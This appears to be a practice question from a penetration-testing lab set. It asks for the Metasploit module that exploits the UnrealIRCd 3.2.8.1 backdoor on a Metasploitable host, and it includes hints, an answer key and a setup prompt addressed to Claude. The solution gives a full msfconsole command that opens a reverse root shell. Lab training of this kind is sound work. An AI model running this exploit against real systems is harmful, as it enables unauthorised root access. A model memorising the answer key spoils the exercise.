# Q046 — UnrealIRCd Backdoor

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` |
| **Domain** | 05 — System Hacking |
| **Difficulty** | 🟡 Medium |
| **Tools** | `metasploit` |
| **Time budget** | 15–25 min |

---

## 📝 Question

Exploit the UnrealIRCd 3.2.8.1 backdoor on Metasploitable port 6667. Report the **module name** used.

---

## 🎯 Flag Format

```
module=<msf-module-path>
```

Example: `module=exploit/unix/irc/unreal_ircd_3281_backdoor`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Search msf for `unreal`.
</details>

<details>
<summary>Hint 2</summary>

Default reverse shell payload works.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
msfconsole -q -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS 192.168.52.129; set LHOST 192.168.52.128; run'
```

Drops shell as `root` typically.

**Answer:** `module=exploit/unix/irc/unreal_ircd_3281_backdoor`

📖 Ref: [playbooks/exploitation-playbook.md](../../playbooks/exploitation-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q046:
1. Verify Metasploitable2 (192.168.52.129) up; UnrealIRCd running on 6667: ssh msfadmin@192.168.52.129 → ps aux | grep ircd (start via /etc/rc.d or /usr/local/unrealircd/unreal start if down).
2. From Parrot: nc 192.168.52.129 6667 should show IRC banner.
3. msfconsole ready.

Report back: "Lab ready for Q046 — UnrealIRCd 6667 reachable on 192.168.52.129".
```
